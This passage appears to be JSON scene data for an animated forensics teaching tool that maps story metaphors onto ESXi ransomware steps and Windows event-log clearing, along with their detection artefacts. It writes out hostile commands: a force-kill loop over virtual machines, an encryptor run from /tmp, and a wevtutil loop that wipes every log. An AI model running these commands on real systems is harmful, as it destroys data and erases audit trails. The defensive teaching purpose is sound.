          "technicalTerm": "Root hypervisor account login logged in /var/log/auth.log",
          "tone": "sky"
        },
        {
          "storyTerm": "Command ticker recording every keystroke",
          "technicalTerm": "ESXi /var/log/shell.log auditing interactive CLI commands executed by root",
          "tone": "rose"
        },
        {
          "storyTerm": "Warning bell noting console activation",
          "technicalTerm": "/var/log/vobd.log flagging SSH or ESXi Shell enablement events",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-dfir-esxi-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Basement management terminal",
          "subtitle": "VMware ESXi SSH daemon or DCUI/vCenter-enabled ESXi Shell",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-esxi-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Chief superintendent key",
          "subtitle": "Root hypervisor account login logged in /var/log/auth.log",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 01 · SETUP",
          "title": "Basement management terminal",
          "storyExcerpt": "Unlocking the basement management terminal as the chief superintendent, the intruder opens an interactive console session while the warehouse built-in authentication diary and command ticker…",
          "technicalParallel": "Under the hood, the observed step executes Log Path 1: /var/log/vobd.log (esx.audit.ssh.enabled / esx.audit.tsm.enabled) (which executes the technical command / telemetry directive , Log Path 1…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Key",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Chief superintendent key",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses chief superintendent key to advance toward command ticker recording every keystroke.",
          "technicalParallel": "When the actor logs into the ESXi host as root over SSH (or enables the ESXi Shell via DCUI/vCenter, generating VOB event esx.audit.ssh.enabled in /var/log/vobd.log), /var/log/auth.log records the SSH…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Bell",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Warning bell noting console activation",
          "storyExcerpt": "Behind the scenes, warning bell noting console activation captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Audit Event 22 (recording EsxiLogFiles=/var/log/auth.log + /var/log/shell.log + /var/log/vobd.log, AuthenticatedUser=root , from 10.10.15.44, ShellCommandLogged=esxcli vm process list…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Blade Vault",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Disk Bolts",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1078"
    },
    "step-2": {
      "scenarioId": "dfir-esxi-hostd-vobd-shell-log-ransomware-encryption-trace",
      "sectionKey": "step-2",
      "sceneKind": "ran-dfir-esxi-step-2",
      "stageBadge": "STEP #2 · EXFIL & IMPACT",
      "title": "Mass Virtual Machine Termination via esxcli vm process kill (/var/log/hostd.log)",
      "storyCue": "Because every live office pod clamps down heavy locks on its own floor foundation while running, the intruder walks down the breaker panel flipping every pod off hard so every foundation slab pops unlocked simultaneously.",
      "technicalCue": "T1529 · EXFIL & IMPACT — Because running vmx hypervisor processes hold exclusive file locks on guest virtual disks (-flat.vmdk), the actor iterates through every World ID and runs esxcli vm process kill --type=force…",
      "storyMappings": [
        {
          "storyTerm": "Live pods clamping locks on their floor foundations",
          "technicalTerm": "Running vmx hypervisor processes holding exclusive locks on *-flat.vmdk disks",
          "tone": "amber"
        },
        {
          "storyTerm": "Flipping every pod breaker off hard",
          "technicalTerm": "Batch execution of esxcli vm process kill --type=force across active World IDs",
          "tone": "sky"
        },
        {
          "storyTerm": "Breaker-panel audit book",
          "technicalTerm": "ESXi /var/log/hostd.log documenting abrupt power-off events for every guest VM",
          "tone": "rose"
        },
        {
          "storyTerm": "Unlocked foundation slabs ready for attack",
          "technicalTerm": "Released datastore file handles under /vmfs/volumes/",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-dfir-esxi-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Live pods clamping locks on their floor…",
          "subtitle": "Running vmx hypervisor processes holding exclusive locks on…",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-esxi-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Flipping every pod breaker off hard",
          "subtitle": "Batch execution of esxcli vm process kill --type=force across…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Live Pods",
          "stageTag": "STEP 02 · SETUP",
          "title": "Live pods clamping locks on their floor foundations",
          "storyExcerpt": "Because every live office pod clamps down heavy locks on its own floor foundation while running, the intruder walks down the breaker panel flipping every pod off hard so every foundation slab…",
          "technicalParallel": "Under the hood, the observed step executes ESXi Command: esxcli vm process kill --type=force --world-id=2104892 (which executes VMware ESXi hypervisor management commands , ESXi Command: esxcli vm…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Pod Off",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Flipping every pod breaker off hard",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses flipping every pod breaker off hard to advance toward breaker-panel audit book.",
          "technicalParallel": "Because running vmx hypervisor processes hold exclusive file locks on guest virtual disks (-flat.vmdk), the actor iterates through every World ID and runs esxcli vm process kill --type=force…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Book",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Unlocked foundation slabs ready for attack",
          "storyExcerpt": "Behind the scenes, unlocked foundation slabs ready for attack captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Audit Event 500 (recording EsxiLogFiles=/var/log/shell.log + /var/log/hostd.log, TerminatedWorldId=2104892 , Guest VM: CORP-DC01, KillType=--type=force , Immediate vmx termination to…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Blade Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Disk Bolts",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1529"
    },
    "step-3": {
      "scenarioId": "dfir-esxi-hostd-vobd-shell-log-ransomware-encryption-trace",
      "sectionKey": "step-3",
      "sceneKind": "ran-dfir-esxi-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Intermittent VMDK Encryption & Flat Descriptor Reconstruction (CISA ESXiArgs Recovery)",
      "storyCue": "Launching a portable padlocking press out of a temporary basement closet, the intruder races across the datastore locking slices of every virtual disk, configuration card, and memory file, leaving forensic responders to audit the footprint and check whether skipped disk slices allow recovery.",
      "technicalCue": "T1486 · EXFIL & IMPACT — The actor launches an ELF encryptor from /tmp/ targeting /vmfs/volumes/*/*/*.vmdk.vmx, and .nvram.",
      "storyMappings": [
        {
          "storyTerm": "Portable padlocking press in a temporary closet",
          "technicalTerm": "Unsigned Linux ELF ransomware encryptor executed from /tmp/",
          "tone": "amber"
        },
        {
          "storyTerm": "Virtual disks, configuration cards, and memory files",
          "technicalTerm": "Target files matching /vmfs/volumes/*/*/*.vmdk, *.vmx, and *.nvram",
          "tone": "sky"
        },
        {
          "storyTerm": "Locking slices intermittently for speed",
          "technicalTerm": "Intermittent block encryption corrupting VM files in seconds",
          "tone": "rose"
        },
        {
          "storyTerm": "Rebuilding intact blueprints from skipped slices",
          "technicalTerm": "CISA ESXiArgs forensic descriptor reconstruction restoring untouched *-flat.vmdk data",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-dfir-esxi-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Portable padlocking press in a temporary…",
          "subtitle": "Unsigned Linux ELF ransomware encryptor executed from /tmp/",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-esxi-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Virtual disks, configuration cards, and…",
          "subtitle": "Target files matching /vmfs/volumes/*/*/*.vmdk, *.vmx, and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Out Disk",
          "stageTag": "STEP 03 · SETUP",
          "title": "Portable padlocking press in a temporary closet",
          "storyExcerpt": "Launching a portable padlocking press out of a temporary basement closet, the intruder races across the datastore locking slices of every virtual disk, configuration card, and memory file…",
          "technicalParallel": "Under the hood, the observed step executes Targeted Datastore Path: /vmfs/volumes/datastore1/CORP-DC01/CORP-DC01-flat.vmdk (which executes the technical command / telemetry directive , Targeted Datastore…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Virtual disks, configuration cards, and memory files",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses virtual disks, configuration cards, and memory files to advance toward locking slices intermittently for speed.",
          "technicalParallel": "The actor launches an ELF encryptor from /tmp/ targeting /vmfs/volumes/*/*/*.vmdk.vmx, and .nvram.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Out Disk",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Rebuilding intact blueprints from skipped slices",
          "storyExcerpt": "Behind the scenes, rebuilding intact blueprints from skipped slices captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Audit Event 59 (recording DatastorePath=/vmfs/volumes/datastore1/CORP-DC01/, TargetedFiles=*.vmdk, *-flat.vmdk, *.vmx, *.nvram, *.vswp, PreventiveKernelControl=esxcli system settings…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Blade Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Disk Bolts",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "dfir-evtx-log-clearing-wevtutil-eid1102-104": {
    "briefing": {
      "scenarioId": "dfir-evtx-log-clearing-wevtutil-eid1102-104",
      "sectionKey": "briefing",
      "sceneKind": "ran-dfir-evtx-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1070.001",
      "title": "Event Log Clearing via wevtutil.exe & USN Journal Recovery (EID 1102 /… — Story-to-Technical Overview",
      "storyCue": "Imagine a burglar who breaks into a bank security booth right before leaving and rips out every single page from every logbook on the shelf. Unbeknownst to the burglar, the moment the security logbook is ripped empty, an automatic brass stamper permanently embosses a fresh Page One declaring exactly who emptied the book and at what second, while the building master floor-tile register still keeps carbon impressions of every ripped page underneath.",
      "technicalCue": "DEFENSE EVASION: Mass Channel Enumeration & wevtutil.exe cl Execution (Sysmon EventID 1) -> DEFENSE EVASION: Immutable Audit Log Cleared Events (Security EventID 1102 & System EventID 104) -> DEFENSE EVASION: NTFS $UsnJrnl:$J Transaction Correlation & Unallocated EVTX Chunk Carving (ElfChnk)",
      "storyMappings": [
        {
          "storyTerm": "Ripping out every single page from every logbook on the shelf",
          "technicalTerm": "wevtutil.exe el loop executing wevtutil.exe cl across all Windows EVTX channels",
          "tone": "amber"
        },
        {
          "storyTerm": "Automatic brass stamper embossing a fresh Page One receipt",
          "technicalTerm": "Immutable Security EventID 1102 and System EventID 104 audit log cleared records",
          "tone": "sky"
        },
        {
          "storyTerm": "Building master floor-tile register logging the destruction",
          "technicalTerm": "NTFS Change Journal ($Extend\\$UsnJrnl:$J) recording USN_REASON_DATA_TRUNCATION",
          "tone": "rose"
        },
        {
          "storyTerm": "Carbon impressions recovered from beneath the floor tiles",
          "technicalTerm": "Carving deleted EVTX XML chunks from unallocated disk clusters during forensics",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-dfir-evtx-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Ripping out every single page from every…",
          "subtitle": "wevtutil.exe el loop executing wevtutil.exe cl across all…",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-evtx-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Automatic brass stamper embossing a…",
          "subtitle": "Immutable Security EventID 1102 and System EventID 104 audit…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Out Page",
          "stageTag": "STAGE 01 · DEFENSE EVASION",
          "title": "Mass Channel Enumeration & wevtutil.exe cl Execution (Sysmon EventID 1)",
          "storyExcerpt": "Trying to cover their tracks right before slipping out the door, the intruder runs an automated sweeper that lists every single diary binder on the building shelf and commands the event clerk to wipe…",
          "technicalParallel": "Under the hood, the observed step executes for /F \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\" (which invokes the Windows Event Collector CLI utility , wevtutil.exe with the cl…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Page One",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Immutable Audit Log Cleared Events (Security EventID 1102 & System EventID 104)",
          "storyExcerpt": "The instant the event clerk empties the master Security binder or System binder, the operating system refuses to leave the binder truly blank and immediately stamps a single unforgeable first entry…",
          "technicalParallel": "Under the hood, the observed step executes Security EventID 1102 (Microsoft-Windows-Eventlog): The audit log was cleared.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Even Desk",
          "stageTag": "STAGE 03 · DEFENSE EVASION",
          "title": "NTFS $UsnJrnl:$J Transaction Correlation & Unallocated EVTX Chunk Carving (ElfChnk)",
          "storyExcerpt": "Even after the binders appear empty on the desk, a skilled forensic investigator checks the building automatic paper-movement ledger showing the exact truncation event and gently lifts intact torn log…",
          "technicalParallel": "Under the hood, the observed step executes MFTECmd.exe -f \"C:\\$Extend\\$UsnJrnl:$J\" --csv C:\\Forensics # Shows USN_REASON_DATA_TRUNCATION on Security.evtx (which Parses or manipulates low-level NTFS…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Log Furnace",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Page-1 Stamp",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-evtx-log-clearing-wevtutil-eid1102-104",
      "sectionKey": "step-1",
      "sceneKind": "ran-dfir-evtx-step-1",
      "stageBadge": "STEP #1 · DEFENSE EVASION",
      "title": "Mass Channel Enumeration & wevtutil.exe cl Execution (Sysmon EventID 1)",
      "storyCue": "Trying to cover their tracks right before slipping out the door, the intruder runs an automated sweeper that lists every single diary binder on the building shelf and commands the event clerk to wipe them clean one by one.",
      "technicalCue": "T1070.001 · DEFENSE EVASION — To erase post-exploitation traces before disconnecting, the attacker runs cmd.exe /c \"for /F %i in ('wevtutil.exe el') do wevtutil.exe cl \"%i\"\" or PowerShell Clear-EventLog.",
      "storyMappings": [
        {
          "storyTerm": "Automated sweeper listing every diary binder",
          "technicalTerm": "cmd.exe /c for /F %i in (wevtutil.exe el) do wevtutil.exe cl %i",
          "tone": "amber"
        },
        {
          "storyTerm": "Commanding the event clerk to wipe each binder",
          "technicalTerm": "Native Windows utility wevtutil.exe cl invoking EvtClearLog across channels",
          "tone": "sky"
        },
        {
          "storyTerm": "Security camera catching the sweeper command line",
          "technicalTerm": "Sysmon EventID 1 (Process Creation) recording the exact wevtutil loop before clear",
          "tone": "rose"
        },
        {
          "storyTerm": "Anti-forensic trace erasure attempt",
          "technicalTerm": "MITRE ATT&CK T1070.001 indicator removal on Windows hosts",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-dfir-evtx-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Automated sweeper listing every diary…",
          "subtitle": "cmd.exe /c for /F %i in (wevtutil.exe el) do wevtutil.exe cl %i",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-evtx-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Commanding the event clerk to wipe each…",
          "subtitle": "Native Windows utility wevtutil.exe cl invoking EvtClearLog…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Out Door",
          "stageTag": "STEP 01 · SETUP",
          "title": "Automated sweeper listing every diary binder",
          "storyExcerpt": "Trying to cover their tracks right before slipping out the door, the intruder runs an automated sweeper that lists every single diary binder on the building shelf and commands the event clerk…",
          "technicalParallel": "Under the hood, the observed step executes for /F \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\" (which invokes the Windows Event Collector CLI utility , wevtutil.exe with the cl…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Wipe Each",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Commanding the event clerk to wipe each binder",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses commanding the event clerk to wipe each binder to advance toward security camera catching the sweeper command line.",
          "technicalParallel": "To erase post-exploitation traces before disconnecting, the attacker runs cmd.exe /c \"for /F %i in ('wevtutil.exe el') do wevtutil.exe cl \"%i\"\" or PowerShell Clear-EventLog.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Line",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Anti-forensic trace erasure attempt",
          "storyExcerpt": "Behind the scenes, anti-forensic trace erasure attempt captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording EventID=1 , Sysmon ProcessCreate, Image=C:\\Windows\\System32\\wevtutil.exe, CommandLine=wevtutil.exe cl Security, ApiInvoked=wevtapi.dll!EvtClearLog under…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Log Furnace",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Page-1 Stamp",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1070.001"
    },
    "step-2": {
      "scenarioId": "dfir-evtx-log-clearing-wevtutil-eid1102-104",
      "sectionKey": "step-2",
      "sceneKind": "ran-dfir-evtx-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Immutable Audit Log Cleared Events (Security EventID 1102 & System EventID 104)",
      "storyCue": "The instant the event clerk empties the master Security binder or System binder, the operating system refuses to leave the binder truly blank and immediately stamps a single unforgeable first entry naming the exact badge holder and timestamp of the erasure.",
      "technicalCue": "T1070.001 · DEFENSE EVASION — When svchost.exe (-k LocalServiceNetworkRestricted -s EventLog) executes EvtClearLog on C:\\Windows\\System32\\winevt\\Logs\\Security.evtx, the kernel immediately writes a fresh first record into…",
      "storyMappings": [
        {
          "storyTerm": "Event clerk emptying the binder files",
          "technicalTerm": "svchost.exe (-s EventLog) calling EvtClearLog on C:\\Windows\\System32\\winevt\\Logs\\",
          "tone": "amber"
        },
        {
          "storyTerm": "Unforgeable Page One stamp in the Security binder",
          "technicalTerm": "Windows Security EventID 1102 (The audit log was cleared) naming SubjectUserName",
          "tone": "sky"
        },
        {
          "storyTerm": "Unforgeable Page One stamp in the System binder",
          "technicalTerm": "Windows System EventID 104 (The log file was cleared) naming the cleared channel",
          "tone": "rose"
        },
        {
          "storyTerm": "Central security archive vault keeping copies untouched",
          "technicalTerm": "Real-time log forwarding preserving pre-clear logs off the compromised host",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-dfir-evtx-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Event clerk emptying the binder files",
          "subtitle": "svchost.exe (-s EventLog) calling EvtClearLog on…",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-evtx-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Unforgeable Page One stamp in the…",
          "subtitle": "Windows Security EventID 1102 (The audit log was cleared)…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 02 · SETUP",
          "title": "Event clerk emptying the binder files",
          "storyExcerpt": "The instant the event clerk empties the master Security binder or System binder, the operating system refuses to leave the binder truly blank and immediately stamps a single unforgeable first…",
          "technicalParallel": "Under the hood, the observed step executes Security EventID 1102 (Microsoft-Windows-Eventlog): The audit log was cleared.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Page One",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Unforgeable Page One stamp in the Security binder",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses unforgeable page one stamp in the security binder to advance toward unforgeable page one stamp in the system binder.",
          "technicalParallel": "When svchost.exe (-k LocalServiceNetworkRestricted -s EventLog) executes EvtClearLog on C:\\Windows\\System32\\winevt\\Logs\\Security.evtx, the kernel immediately writes a fresh first record into the cleared…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Page One",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Central central security ledger vault keeping copies…",
          "storyExcerpt": "Behind the scenes, central central security ledger vault keeping copies untouched captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 1102 (recording SecurityEventID=1102 , The audit log was cleared, SystemEventID=104 , Event log channel cleared, SubjectUserName=CORP\\admin_ops, ClearedChannel=Security &…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Log Furnace",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Page-1 Stamp",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1070.001"
    },
    "step-3": {
      "scenarioId": "dfir-evtx-log-clearing-wevtutil-eid1102-104",
      "sectionKey": "step-3",
      "sceneKind": "ran-dfir-evtx-step-3",
      "stageBadge": "STEP #3 · DEFENSE EVASION",
      "title": "NTFS $UsnJrnl:$J Transaction Correlation & Unallocated EVTX Chunk Carving (ElfChnk)",
      "storyCue": "Even after the binders appear empty on the desk, a skilled forensic investigator checks the building automatic paper-movement ledger showing the exact truncation event and gently lifts intact torn log scraps straight out of the unallocated storage bin underneath.",
      "technicalCue": "T1070.001 · DEFENSE EVASION — During disk forensics, the analyst parses the NTFS Change Journal ($Extend\\$UsnJrnl:$J) showing USN_REASON_DATA_TRUNCATION (0x00000200) on Security.evtx at 03:55:01 UTC, and carves unallocated…",
      "storyMappings": [
        {
          "storyTerm": "Automatic paper-movement ledger",
          "technicalTerm": "NTFS Change Journal ($Extend\\$UsnJrnl:$J) logging USN_REASON_DATA_TRUNCATION",
          "tone": "amber"
        },
        {
          "storyTerm": "Intact torn log scraps in the storage bin underneath",
          "technicalTerm": "Deleted 64KB ElfChnk EVTX chunks still residing in unallocated NTFS disk space",
          "tone": "sky"
        },
        {
          "storyTerm": "Gently lifting and reassembling the scraps",
          "technicalTerm": "Raw disk carving tools recovering cleared binary XML event records",
          "tone": "rose"
        },
        {
          "storyTerm": "Proving deliberate cover-up with exact timestamps",
          "technicalTerm": "Correlating $UsnJrnl timestamps against EventID 1102 and carved pre-wipe logs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-dfir-evtx-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Automatic paper-movement ledger",
          "subtitle": "NTFS Change Journal ($Extend\\$UsnJrnl:$J) logging…",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-evtx-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Intact torn log scraps in the storage…",
          "subtitle": "Deleted 64KB ElfChnk EVTX chunks still residing in unallocated…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Even Desk",
          "stageTag": "STEP 03 · SETUP",
          "title": "Automatic paper-movement ledger",
          "storyExcerpt": "Even after the binders appear empty on the desk, a skilled forensic investigator checks the building automatic paper-movement ledger showing the exact truncation event and gently lifts intact…",
          "technicalParallel": "Under the hood, the observed step executes MFTECmd.exe -f \"C:\\$Extend\\$UsnJrnl:$J\" --csv C:\\Forensics # Shows USN_REASON_DATA_TRUNCATION on Security.evtx (which Parses or manipulates low-level NTFS…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Torn Log",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Intact torn log scraps in the storage bin underneath",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses intact torn log scraps in the storage bin underneath to advance toward gently lifting and reassembling the scraps.",
          "technicalParallel": "During disk forensics, the analyst parses the NTFS Change Journal ($Extend\\$UsnJrnl:$J) showing USN_REASON_DATA_TRUNCATION (0x00000200) on Security.evtx at 03:55:01 UTC, and carves unallocated NTFS…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Even Desk",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Proving deliberate cover-up with exact timestamps",
          "storyExcerpt": "Behind the scenes, proving deliberate cover-up with exact timestamps captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 200 (recording NtfsArtifact=C:\\$Extend\\$UsnJrnl:$J , Update Sequence Number Journal, UsnReasonFlag=USN_REASON_DATA_TRUNCATION , 0x00000200, EvtxChunkMagic=45 6C 66 43 68 6E…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Log Furnace",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
